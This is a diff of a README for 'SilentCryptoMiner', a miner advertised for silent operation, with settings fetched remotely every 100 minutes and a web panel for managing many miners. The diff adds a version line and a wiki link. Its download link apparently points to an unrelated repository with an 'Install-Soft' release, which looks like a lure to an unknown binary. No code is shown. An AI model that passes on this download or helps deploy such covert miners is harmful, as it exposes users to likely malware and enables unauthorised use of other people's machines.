@@ -1,9 +1,10 @@
 
 # Download - [link](https://github.com/TDropX/XShroudAlerts2022/releases/tag/Install-Soft)
 <blockquote>
-<p dir="ltr">latest version /p>
+<p dir="ltr">latest version 2024</p>
 </blockquote>
-<hr /
+
+
 
 <img src="https://github.com/UnamSanctam/SilentCryptoMiner/blob/master/SilentCryptoMiner.png?raw=true">
 
@@ -70,3 +71,6 @@ This miner can mine all the following algorithms and thus any cryptocurrency tha
 * Remote Configuration - Can get the miner settings remotely from a specified URL every 100 minutes
 * Web Panel Support - Has support for monitoring and configuring all the miners efficiently in a free self-hosted online web panel
 * And many many more.
+## Wiki
+
+You can find the wiki [here](https://github.com/UnamSanctam/SilentCryptoMiner/wiki) or at the top of the page. The wiki contains information about the miner and all of its features, it also has some answers to frequently asked questions.
